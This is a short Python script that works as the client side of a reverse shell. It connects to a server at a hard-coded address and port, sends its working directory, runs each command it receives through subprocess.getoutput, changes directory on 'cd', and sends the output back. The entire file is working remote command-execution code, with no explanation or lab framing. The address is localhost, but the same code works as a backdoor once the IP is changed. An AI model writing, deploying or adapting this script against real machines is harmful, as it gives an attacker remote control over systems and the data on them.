import socket
import time
import os
import subprocess

IP = "127.0.0.1"
PORT = 5050
ADDR = (IP, PORT)
BUFFER = 5120
DELAY = 0.01

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def send(msg):
	msg = msg.encode()
	msg_len = len(msg)
	send_len = str(msg_len).encode()
	send_len += b' ' * (BUFFER - len(send_len))

	time.sleep(DELAY)
	client.send(send_len)
	client.send(msg)

def recv():
	length = client.recv(BUFFER).decode()
	if length:
		cmd = client.recv(int(float(length))).decode()
		return cmd


while True:
	path = os.getcwd()
	send(path)
	
	cmd = recv()
	
	if cmd == " ":
		send(cmd)
		continue
	else:
		try:
			token = cmd.split(" ")
			if token[0].lower() == "cd":
				if len(token) > 1 and token[1] != "":
					os.chdir(token[1])
					output = "Changed dir to " + os.getcwd()
				else:
					output = " "
			else:
				output = subprocess.getoutput(cmd)
		except Exception as e:
			output = str(e)

		send(output)
	
